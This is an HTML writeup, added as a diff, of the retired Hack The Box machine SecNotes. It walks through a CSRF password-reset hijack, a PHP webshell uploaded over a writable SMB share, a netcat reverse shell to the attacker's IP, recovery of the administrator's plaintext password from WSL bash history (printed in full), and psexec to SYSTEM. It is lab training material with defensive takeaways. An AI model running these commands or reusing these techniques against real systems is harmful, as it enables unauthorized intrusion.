@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SecNotes &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge htb">HTB</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>SecNotes</h1>
+    <div class="meta">Target: <code>10.10.14.143</code></div>
+    <div class="tags"><span class="tag">Windows</span><span class="tag">IIS</span><span class="tag">CSRF</span><span class="tag">XSRF</span><span class="tag">SMB</span><span class="tag">SMBMap</span><span class="tag">PHP</span><span class="tag">WSL</span><span class="tag">BashHistory</span><span class="tag">PSExec</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl3" href="#web-enumeration">Web Enumeration</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#csrf-password-reset">CSRF Password Reset</a><a class="lvl3" href="#webshell-via-smb-write">Webshell via SMB Write</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#wsl-bash-history-administrator-credentials">WSL Bash History → Administrator Credentials</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>SecNotes is a medium Windows box built around a note-taking web app with two authentication flaws and a Linux Subsystem for Windows (WSL) foothold. A CSRF vulnerability in the password reset endpoint lets you hijack the admin account without knowing the original password. Tyler's notes contain SMB credentials that expose a writable share serving the port 8808 web root, so a webshell gives a shell as Tyler. Root comes from Tyler's WSL bash history, which contains the Administrator SMB password in plaintext.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE      VERSION
+80/tcp   open  http         Microsoft IIS httpd 10.0
+|_http-title: Secure Notes - Login
+445/tcp  open  microsoft-ds Microsoft Windows 7-10 microsoft-ds
+8808/tcp open  http         Microsoft IIS httpd 10.0
+</code></pre>
+<p>Two HTTP ports: 80 serves the notes app, 8808 appears blank at this stage.</p>
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p>GoBuster finds the endpoints of the notes application on port 80:</p>
+<pre><code class="language-sh">gobuster dir -u http://10.129.36.233/ -w /home/kali/Tools/SecLists/Discovery/Web-Content/big.txt -x php
+
+/contact.php          (Status: 302) [--&gt; login.php]
+/home.php             (Status: 302) [--&gt; login.php]
+/login.php            (Status: 200)
+/logout.php           (Status: 302) [--&gt; login.php]
+/register.php         (Status: 200)
+</code></pre>
+<p>The app allows account creation. Registering with the username <code>administrator</code> and logging in surfaces a banner revealing the real admin's email:</p>
+<pre><code>tyler@secnotes.htb
+</code></pre>
+<h2 id="foothold">Foothold</h2>
+<h3 id="csrf-password-reset">CSRF Password Reset</h3>
+<p>The password reset endpoint accepts GET requests with parameters inline:</p>
+<pre><code>GET /change_pass.php?password=password&amp;confirm_password=password&amp;submit=submit
+</code></pre>
+<p>The app has a "Contact Us" form that sends messages to <code>tyler@secnotes.htb</code>. Testing with a link to a Kali HTTP server confirms the server fetches arbitrary URLs shortly after submission. This is a CSRF vector: craft the password reset URL and send it through Contact Us. When Tyler's session fetches the link, his password is reset to a known value:</p>
+<pre><code>http://10.129.200.12/change_pass.php?password=password&amp;confirm_password=password&amp;submit=submit
+http://10.10.14.143/
+</code></pre>
+<p>After the confirmation request arrives on the Kali server, log in as <code>tyler</code>. His notes include a section titled "new site":</p>
+<pre><code>\\secnotes.htb\new-site
+tyler / ‹redacted›
+</code></pre>
+<blockquote>
+<p><strong>Why this CSRF works:</strong> the password reset was GET-accessible and required no CSRF token, so any link Tyler's browser followed would silently execute it. The Contact Us form was the delivery mechanism. The second URL (back to Kali) served as a receipt, when the request arrived, the reset had already fired.</p>
+</blockquote>
+<h3 id="webshell-via-smb-write">Webshell via SMB Write</h3>
+<p>SMBMap confirms <code>tyler</code> has read/write access to the <code>new-site</code> share, and the filenames (<code>iisstart.htm</code>, <code>iisstart.png</code>) identify it as the web root for port 8808:</p>
+<pre><code class="language-sh">smbmap -H 10.129.89.237 -u tyler -p '‹redacted›'
+new-site    READ, WRITE
+</code></pre>
+<pre><code class="language-sh">smbclient -U 'tyler%‹redacted›' //10.129.89.237/new-site
+smb: \&gt; dir
+  iisstart.htm
+  iisstart.png
+</code></pre>
+<p>Upload a webshell and <code>nc64.exe</code>, then trigger a reverse shell:</p>
+<pre><code>curl http://10.129.89.237:8808/webshell.php?cmd=nc64.exe%2010.10.14.143%20443%20-e%20cmd.exe
+</code></pre>
+<pre><code class="language-sh">rlwrap nc -lvnp 443
+connect to [10.10.14.143] from (UNKNOWN) [10.129.89.237] 51043
+
+C:\inetpub\new-site&gt;whoami
+secnotes\tyler
+</code></pre>
+<p>User flag obtained from Tyler's Desktop.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="wsl-bash-history-administrator-credentials">WSL Bash History → Administrator Credentials</h3>
+<p>Tyler's Desktop contains a shortcut to <code>bash.exe</code>, indicating Windows Subsystem for Linux is installed. Executing it drops into a WSL root shell (sandboxed, not the Windows host). Inside that shell, bash history is readable:</p>
+<pre><code class="language-sh">cat /root/.bash_history
+smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
+</code></pre>
+<blockquote>
+<p><strong>Why bash history leaks credentials here:</strong> the administrator had previously authenticated to SMB from within the WSL environment and typed the password inline on the command line. Bash records every command, including inline credentials, to <code>~/.bash_history</code>, readable by anyone who can reach that WSL root shell.</p>
+</blockquote>
+<p>Credentials recovered:</p>
+<pre><code>administrator : u6!4ZwgwOM#^OBf#Nwnh
+</code></pre>
+<h2 id="root">Root</h2>
+<p>With local administrator credentials, Impacket's <code>psexec</code> gives a SYSTEM shell:</p>
+<pre><code class="language-sh">impacket-psexec administrator@10.129.89.237
+[*] Found writable share ADMIN$
+[*] Uploading file lGVPETPJ.exe
+[*] Creating service YKsX on 10.129.89.237.....
+[*] Starting service YKsX.....
+
+C:\WINDOWS\system32&gt; whoami
+nt authority\system
+</code></pre>
+<pre><code>C:\Users\Administrator\Desktop&gt; type root.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>GET-based password reset with no CSRF token is trivially hijackable.</strong> Any link the victim follows executes the action under their session.</li>
+<li><strong>Notes apps store credentials.</strong> Tyler left plaintext SMB creds in his own note, check every data store a user owns.</li>
+<li><strong>WSL bash history is a goldmine.</strong> Admins who use WSL often paste credentials inline; that history persists in the WSL filesystem and is readable via Windows paths or by entering the WSL environment.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
